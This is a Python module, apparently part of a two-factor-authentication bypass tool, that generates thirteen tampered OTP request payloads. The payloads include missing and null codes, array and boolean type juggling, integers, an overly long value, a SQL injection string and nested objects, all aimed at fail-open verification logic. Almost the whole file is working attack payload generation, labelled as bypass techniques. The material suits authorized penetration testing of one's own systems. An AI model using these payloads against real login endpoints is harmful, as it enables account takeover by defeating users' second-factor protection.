"""
Logic bypass attack module.
Tests for common 2FA logic errors: null, missing params, type juggling, etc.
"""
import logging
from typing import Dict, Any, List

logger = logging.getLogger(__name__)


class LogicBypassModule:
    """Implements logic error-based 2FA bypass techniques."""
    
    def __init__(self, base_payload: Dict[str, Any], otp_parameter: str = "code"):
        """
        Initialize logic bypass module.
        
        Args:
            base_payload: Original request payload (e.g., {"code": "123456", "user_id": "123"})
            otp_parameter: Name of the OTP/2FA code parameter
        """
        self.base_payload = base_payload.copy()
        self.otp_param = otp_parameter
        logger.info(f"LogicBypassModule initialized. OTP param: '{otp_parameter}'")
    
    def generate_payloads(self) -> List[Dict[str, Any]]:
        """
        Generate all logic bypass payload variants.
        
        Returns:
            List of (attack_name, payload) tuples
        """
        payloads = []
        
        # 1. Missing Parameter (Fail-Open Bug)
        payload_missing = self.base_payload.copy()
        if self.otp_param in payload_missing:
            del payload_missing[self.otp_param]
        payloads.append(("Missing OTP Parameter", payload_missing))
        
        # 2. Null Value
        payload_null = self.base_payload.copy()
        payload_null[self.otp_param] = None
        payloads.append(("Null OTP Value", payload_null))
        
        # 3. Empty String
        payload_empty = self.base_payload.copy()
        payload_empty[self.otp_param] = ""
        payloads.append(("Empty String OTP", payload_empty))
        
        # 4. Array Injection (PHP/Node.js type confusion)
        payload_array = self.base_payload.copy()
        # Remove original param and add array variant
        if self.otp_param in payload_array:
            del payload_array[self.otp_param]
        payload_array[f"{self.otp_param}[]"] = self.base_payload.get(self.otp_param, "123456")
        payloads.append(("Array Injection (code[])", payload_array))
        
        # 5. Boolean True
        payload_bool_true = self.base_payload.copy()
        payload_bool_true[self.otp_param] = True
        payloads.append(("Boolean True", payload_bool_true))
        
        # 6. Boolean False
        payload_bool_false = self.base_payload.copy()
        payload_bool_false[self.otp_param] = False
        payloads.append(("Boolean False", payload_bool_false))
        
        # 7. Integer 0
        payload_zero = self.base_payload.copy()
        payload_zero[self.otp_param] = 0
        payloads.append(("Integer Zero", payload_zero))
        
        # 8. Integer 1
        payload_one = self.base_payload.copy()
        payload_one[self.otp_param] = 1
        payloads.append(("Integer One", payload_one))
        
        # 9. Very Long String (Potential Buffer/Logic Error)
        payload_long = self.base_payload.copy()
        payload_long[self.otp_param] = "9" * 1000
        payloads.append(("Overly Long OTP", payload_long))
        
        # 10. Special Characters / SQL-like
        payload_special = self.base_payload.copy()
        payload_special[self.otp_param] = "' OR '1'='1"
        payloads.append(("SQL-like Injection", payload_special))
        
        # 11. Negative Integer
        payload_negative = self.base_payload.copy()
        payload_negative[self.otp_param] = -1
        payloads.append(("Negative Integer", payload_negative))
        
        # 12. Float/Decimal
        payload_float = self.base_payload.copy()
        payload_float[self.otp_param] = 123.456
        payloads.append(("Float Value", payload_float))
        
        # 13. Object/Dict (Deep type confusion)
        payload_object = self.base_payload.copy()
        payload_object[self.otp_param] = {"nested": "object"}
        payloads.append(("Object/Dict Value", payload_object))
        
        logger.info(f"Generated {len(payloads)} logic bypass payloads")
        return payloads
    
    def get_description(self) -> str:
        """Return module description."""
        return """
        Logic Bypass Module - Tests for common 2FA logic errors:
        - Missing/null parameters (fail-open bugs)
        - Type juggling (array, boolean, integer confusion)
        - Boundary conditions (empty, very long, negative values)
        - Special characters and injection attempts
        """
